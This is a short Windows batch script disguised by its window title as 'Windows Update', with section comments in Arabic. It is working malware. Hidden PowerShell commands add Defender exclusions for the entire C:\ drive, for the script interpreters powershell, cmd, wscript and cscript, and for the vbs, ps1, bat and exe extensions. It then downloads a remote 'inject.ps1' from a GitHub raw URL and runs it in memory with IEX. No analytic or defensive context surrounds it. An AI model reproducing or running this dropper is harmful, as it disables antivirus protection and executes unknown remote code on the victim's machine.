@echo off
title Windows Update

:: ============================================
:: 1. إضافة استثناء C:\ في Defender
:: ============================================
echo [*] Adding Defender exclusion...

powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue"

powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue"
powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionProcess 'cmd.exe' -ErrorAction SilentlyContinue"
powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionProcess 'wscript.exe' -ErrorAction SilentlyContinue"
powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionProcess 'cscript.exe' -ErrorAction SilentlyContinue"

powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionExtension 'vbs' -ErrorAction SilentlyContinue"
powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionExtension 'ps1' -ErrorAction SilentlyContinue"
powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionExtension 'bat' -ErrorAction SilentlyContinue"
powershell -NoP -sta -NonI -W Hidden -Command "Add-MpPreference -ExclusionExtension 'exe' -ErrorAction SilentlyContinue"

echo [+] Exclusions added

:: ============================================
:: 2. تشغيل inject.ps1
:: ============================================
echo [*] Running inject.ps1...

powershell -NoP -sta -NonI -W Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Mouted/Hos/main/inject.ps1')"

echo [+] Done
exit
